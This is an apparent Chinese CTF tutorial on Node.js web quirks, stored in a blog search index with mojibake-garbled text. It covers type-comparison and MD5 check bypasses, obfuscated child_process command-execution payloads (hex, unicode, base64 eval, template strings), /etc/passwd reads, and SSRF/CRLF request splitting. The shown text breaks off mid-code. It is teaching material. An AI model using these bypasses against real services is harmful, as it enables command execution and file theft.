<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctf-nodejsä¹‹ä¸€äº›å°çŸ¥è¯†</title>
      <link href="/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/"/>
      <url>/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä¹Ÿæ˜¯éå¸¸æœ‰å¹¸èƒ½ä¸ºå¤§å®¶å»è®²è§£CTFä¸­nodejsçš„ä¸€äº›å°çŸ¥è¯†ï¼Œå…³äºctf-webç³»åˆ—è¯¾ç¨‹å·²ç»åœ¨bilibilié™†ç»­å‘å¸ƒ <a href="https://www.bilibili.com/video/BV1uL411P7xt/">https://www.bilibili.com/video/BV1uL411P7xt/</a> ï¼Œå¤§å®¶åœ¨æœ‰ä»€ä¹ˆç–‘é—®å¯ä»¥éšæ—¶åœ¨è¯„è®ºåŒºç•™è¨€å“¦~</p><h2 id="1-nodejsåŸºç¡€"><a href="#1-nodejsåŸºç¡€" class="headerlink" title="1 nodejsåŸºç¡€"></a>1 nodejsåŸºç¡€</h2><h3 id="1-1-nodejsçš„ç®€å•ä»‹ç»"><a href="#1-1-nodejsçš„ç®€å•ä»‹ç»" class="headerlink" title="1.1 nodejsçš„ç®€å•ä»‹ç»"></a>1.1 nodejsçš„ç®€å•ä»‹ç»</h3><p>ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚<br>Node.js æ˜¯ä¸€ä¸ªåŸºäºChrome JavaScript è¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°ã€‚<br>Node.jsæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨I/OæœåŠ¡ç«¯JavaScriptç¯å¢ƒï¼ŒåŸºäºGoogleçš„V8å¼•æ“ï¼ŒV8å¼•æ“æ‰§è¡ŒJavascriptçš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚</p><p><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">nodejsè¯­æ³•å­¦ä¹ </a></p><h3 id="1-2-nodejsè¯­è¨€çš„ç¼ºç‚¹"><a href="#1-2-nodejsè¯­è¨€çš„ç¼ºç‚¹" class="headerlink" title="1.2 nodejsè¯­è¨€çš„ç¼ºç‚¹"></a>1.2 nodejsè¯­è¨€çš„ç¼ºç‚¹</h3><h4 id="1-2-1-å¤§å°å†™ç‰¹æ€§"><a href="#1-2-1-å¤§å°å†™ç‰¹æ€§" class="headerlink" title="1.2.1 å¤§å°å†™ç‰¹æ€§"></a>1.2.1 å¤§å°å†™ç‰¹æ€§</h4><p>toUpperCase()<br>toLowerCase()</p><p>å¯¹äºtoUpperCase(): å­—ç¬¦<code>&quot;Ä±&quot;</code>ã€<code>&quot;Å¿&quot;</code> ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º <code>&quot;I&quot;</code>ã€<code>&quot;S&quot;</code><br>å¯¹äºtoLowerCase(): å­—ç¬¦<code>&quot;K&quot;</code>ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º<code>&quot;k&quot;</code>(è¿™ä¸ªKä¸æ˜¯K)</p><h4 id="1-2-2-å¼±ç±»å‹æ¯”è¾ƒ"><a href="#1-2-2-å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="1.2.2 å¼±ç±»å‹æ¯”è¾ƒ"></a>1.2.2 å¼±ç±»å‹æ¯”è¾ƒ</h4><p><strong>å¤§å°æ¯”è¾ƒ</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">></span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token operator">></span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'111'</span><span class="token operator">></span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'asd'</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ç»“ï¼šæ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼›è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç çš„è¿™ç§æƒ…å†µï¼›è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false</p><p><em>æ•°ç»„çš„æ¯”è¾ƒï¼š</em></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ç»“ï¼šç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalseï¼Œæ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•ï¼Œæ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸²ï¼›æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ</p><p><em>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š</em></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// è¾“å‡ºï¼štrue </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// è¾“å‡ºï¼šfalse </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">==</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// è¾“å‡ºï¼šfalse </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">===</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// è¾“å‡ºï¼šfalse</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å˜é‡æ‹¼æ¥</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,3 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,6 </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//56,6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-MD5çš„ç»•è¿‡"><a href="#1-2-3-MD5çš„ç»•è¿‡" class="headerlink" title="1.2.3 MD5çš„ç»•è¿‡"></a>1.2.3 MD5çš„ç»•è¿‡</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>a[x]=1&amp;b[x]=2</p><p>æ•°ç»„ä¼šè¢«è§£ææˆ<code>[object Object]</code></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">a<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>b<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'2'</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-4-ç¼–ç ç»•è¿‡"><a href="#1-2-4-ç¼–ç ç»•è¿‡" class="headerlink" title="1.2.4 ç¼–ç ç»•è¿‡"></a>1.2.4 ç¼–ç ç»•è¿‡</h4><p><strong>16è¿›åˆ¶ç¼–ç </strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">===</span><span class="token string">"\x61"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>unicodeç¼–ç </strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\u0061"</span><span class="token operator">===</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>baseç¼–ç </strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'Y29uc29sZS5sb2coImhhaGFoYWhhIik7'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#1-3-nodejså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="1.3 nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>1.3 nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</h3><h4 id="1-3-1-nodejså±é™©å‡½æ•°-å‘½ä»¤æ‰§è¡Œ"><a href="#1-3-1-nodejså±é™©å‡½æ•°-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1.3.1 nodejså±é™©å‡½æ•°-å‘½ä»¤æ‰§è¡Œ"></a>1.3.1 nodejså±é™©å‡½æ•°-å‘½ä»¤æ‰§è¡Œ</h4><p>exec()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'open /System/Applications/Calculator.app'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>eval()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"document.cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ‰§è¡Œdocument.cookie</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"document.cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è¾“å‡ºdocument.cookie</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="1-3-2-nodejså±é™©å‡½æ•°-æ–‡ä»¶è¯»å†™"><a href="#1-3-2-nodejså±é™©å‡½æ•°-æ–‡ä»¶è¯»å†™" class="headerlink" title="1.3.2 nodejså±é™©å‡½æ•°-æ–‡ä»¶è¯»å†™"></a>1.3.2 nodejså±é™©å‡½æ•°-æ–‡ä»¶è¯»å†™</h4><p><strong>è¯»</strong></p><p>readFileSync()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err<span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>readFile()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å†™</strong></p><p>writeFileSync()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">,</span><span class="token string">'sss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>writeFile()</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'input.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3-3-nodejså±é™©å‡½æ•°-RCE-bypass"><a href="#1-3-3-nodejså±é™©å‡½æ•°-RCE-bypass" class="headerlink" title="1.3.3 nodejså±é™©å‡½æ•°-RCE bypass"></a>1.3.3 nodejså±é™©å‡½æ•°-RCE bypass</h4><p><strong>bypass</strong></p><p>åŸå‹ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å­—ç¬¦æ‹¼æ¥ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2b<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span class="token comment">//(%2bå°±æ˜¯+çš„urlç¼–ç )</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"exe"</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">"cSync"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"open /System/Applications/Calculator.app/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–ç ç»•è¿‡ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"\x65\x78\x65\x63\x53\x79\x6e\x63"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat fl001g.txt'</span><span class="token punctuation">)</span><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw=='</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//å¼¹è®¡ç®—å™¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ¨¡æ¿æ‹¼æ¥ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">exe</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">cSync</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'open /System/Applications/Calculator.app/'</span>ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶ä»–å‡½æ•°ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"sleep 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"sleep 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFile</span><span class="token punctuation">(</span><span class="token string">"/bin/sleep"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment">//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-nodejsä¸­çš„ssrf"><a href="#1-4-nodejsä¸­çš„ssrf" class="headerlink" title="1.4 nodejsä¸­çš„ssrf"></a>1.4 nodejsä¸­çš„ssrf</h3><h4 id="1-4-1-é€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»"><a href="#1-4-1-é€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»" class="headerlink" title="1.4.1 é€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»"></a>1.4.1 é€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»</h4><p><strong>åŸç†</strong></p><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ã€‚ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">></span> v <span class="token operator">=</span> <span class="token string">"/caf\u&#123;E9&#125;\u&#123;01F436&#125;"</span><span class="token string">'/cafÃ©ğŸ¶'</span><span class="token operator">></span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token string">'latin1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span><span class="token string">'/cafÃ©=6'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Crlf HTTPå¤´æ³¨å…¥:</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">></span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://example.com/\r\n/test'</span><span class="token punctuation">)</span><span class="token 